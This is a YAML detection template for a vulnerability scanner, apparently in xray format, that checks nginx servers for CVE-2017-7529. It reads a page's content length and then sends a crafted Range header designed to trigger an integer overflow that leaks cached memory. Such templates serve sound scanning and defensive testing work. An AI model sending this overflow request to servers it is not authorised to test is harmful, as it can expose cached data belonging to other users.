name: poc-yaml-nginx-cve-2017-7529-info-leak
binding: 1e70cf7c-ef4d-4f75-b6d3-22de6792561e
manual: true
detail:
    author: leommxj
    links:
        - https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529
        - https://github.com/MaxSecurity/CVE-2017-7529-POC/
        - https://cloud.tencent.com/developer/article/1680572
    vulnerability:
        id: CT-91307
        level: high
transport: http
set:
    r1: randomInt(100, 200)
    inputPath: request.url.path
rules:
    tricache:
        request:
            cache: true
            method: GET
            path: ^{{inputPath}}
        expression: response.status == 200 && "content-length" in response.headers && response.headers["Server"].contains("nginx")
        output:
            "n": int(response.headers["content-length"]) + r1
            nminus: 775808 - n
    check:
        request:
            cache: true
            method: GET
            path: ^{{inputPath}}
            headers:
                Range: bytes=-{{n}},-9223372036854{{nminus}}
        expression: |
            response.status == 206 && response.raw.bcontains(b"Content-Range: bytes -" + bytes(string(r1))) && response.body.bcontains(bytes("boundary=(?P<boundary>.*)".submatch(response.headers["Content-Type"])["boundary"]))
expression: tricache() && check()
